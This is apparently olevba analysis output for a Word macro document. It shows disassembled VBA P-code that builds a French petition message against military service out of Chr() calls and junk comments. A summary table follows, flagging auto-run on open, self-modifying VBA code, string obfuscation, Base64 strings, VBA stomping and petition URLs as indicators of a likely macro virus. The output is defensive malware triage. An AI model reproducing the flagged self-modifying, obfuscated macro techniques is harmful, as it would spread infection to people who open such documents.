' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "250"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "000"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "étudiants,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "salariés,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "rêveurs,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c1 
' 	QuoteRem 0x008F 0x0005 " ivbd"
' Line #193:
' 	LineCont 0x0008 37 00 00 00 5C 00 00 00
' 	Ld c1 
' 	LitStr 0x000E "entrepreneurs,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "chômeurs,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "voyageurs"
' 	Add 
' 	St c1 
' 	BoS 0x0000 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0002 "ou"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "tout"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "simplement"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "amoureux"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "ont"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "autres"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "projets"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Vie"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St b2 
' 	QuoteRem 0x001A 0x0007 " ibbxlm"
' Line #194:
' 	LineCont 0x000C 18 00 00 00 3D 00 00 00 43 00 00 00
' 	Ld b2 
' 	LitStr 0x0004 "pour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "ces"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "mois."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Ils"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "refusent"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "effectuer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "inégalitaire"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St b2 
' 	QuoteRem 0x002F 0x0007 " xbmsdb"
' Line #195:
' 	LineCont 0x000C 55 00 00 00 60 00 00 00 76 00 00 00
' 	Ld b2 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "dépassé,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bref"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ne"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sert"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "plus"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "rien."
' 	Add 
' 	St b2 
' 	BoS 0x0000 
' 	LitStr 0x000F "Mobilisons-nous"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "!"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "Pétition"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "pour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "sursitaires"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sous"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "contrat"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "travail:"
' 	Add 
' 	St b1 
' 	QuoteRem 0x0045 0x000A " fdvmsdipq"
' Line #196:
' 	LineCont 0x0010 2B 00 00 00 33 00 00 00 60 00 00 00 66 00 00 00
' 	Ld b1 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0012 "http://sn.agat.net"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "La"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "révolte"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "militaire:"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0022 "http://altern.org/gigm/service.htm"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St b1 
' 	BoS 0x0000 
' 	LitStr 0x0002 "La"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "pétition"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "magazine"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Don"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "Quichotte:"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001B "http://www.donquichotte.com"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Non"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "au"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "S.N."
' 	Add 
' 	St a1 
' 	QuoteRem 0x0054 0x000E " voxubmswmkqiw"
' Line #197:
' 	Ld a1 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "tue"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "emploi:"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0020 "http://www.multimania.com/antisn"
' 	Add 
' 	St a1 
' 	BoS 0x0000 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e4 
' 	QuoteRem 0x00D0 0x0006 " migbs"
' Line #198:
' 	LineCont 0x0004 0B 00 00 00
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St j17 
' 	BoS 0x0000 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c7 
' 	BoS 0x0000 
' 	EndSub 
' 	QuoteRem 0x0061 0x000E " fcwhujezhorom"
' Line #199:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|environ             |May read system environment variables        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://sn.agat.net  |URL                                          |
|IOC       |http://altern.org/gi|URL                                          |
|          |gm/service.htm      |                                             |
|IOC       |http://www.donquicho|URL                                          |
|          |tte.com             |                                             |
|IOC       |http://www.multimani|URL                                          |
|          |a.com/antisn        |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

